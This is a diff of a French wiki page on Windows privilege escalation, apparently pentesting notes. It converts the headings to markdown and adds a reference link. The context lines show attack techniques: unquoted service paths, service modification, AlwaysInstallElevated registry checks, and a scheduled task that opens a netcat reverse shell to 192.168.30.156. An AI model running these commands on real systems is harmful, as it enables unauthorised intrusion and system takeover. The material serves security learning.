@@ -8,8 +8,7 @@ permalink: /Elévation_de_priviléges_(Windows)/
 
 The following elements are based on <http://toshellandback.com/2015/11/24/ms-priv-esc/>
 
-Trusted Service Paths
----------------------
+## Trusted Service Paths
 
 Si le "Service path" d'un service n'est pas mis entre quote il est possible d'effectuer une attaque. Pour l'exemple on considère le Service Path suivant:
 
@@ -48,8 +47,7 @@ sc start PFNet
 
 Si on a pas les privilèges pour redémarrer le service, on peut essayer de redémarrer le serveur.
 
-Modifier un service Windows
----------------------------
+## Modifier un service Windows
 
 Avec de la chance il est possible de modifier un service. L'outil [accesschk](/accesschk "wikilink") peut être utilisé pour vérifier ceci:
 
@@ -75,8 +73,7 @@ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
 
-Alternatives à RunAs
---------------------
+## Alternatives à RunAs
 
 On est parfois dans des situations où on a:
 
@@ -102,8 +99,7 @@ schtasks /create /sc once /tr "nc.exe -e cmd.exe 192.168.30.156 443" /tn MASUPER
 schtasks /run /tn MASUPERTACHE
 ```
 
-Ressources
-----------
+## Ressources
 
 ### Outils
 
@@ -119,5 +115,6 @@ Ressources
 -   [All roads lead to SYSTEM (PDF)](https://labs.mwrinfosecurity.com/system/assets/760/original/Windows_Services_-_All_roads_lead_to_SYSTEM.pdf)
 -   [Elevating privileges by exploiting weak folder permissions](http://www.greyhathacker.net/?p=738)
 -   [Windows Privilege Escalation Vectors](http://toshellandback.com/2015/11/24/ms-priv-esc/Common)
+-   [Abusing Token Privileges For Windows Local Privilege Escalation](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)
 
 
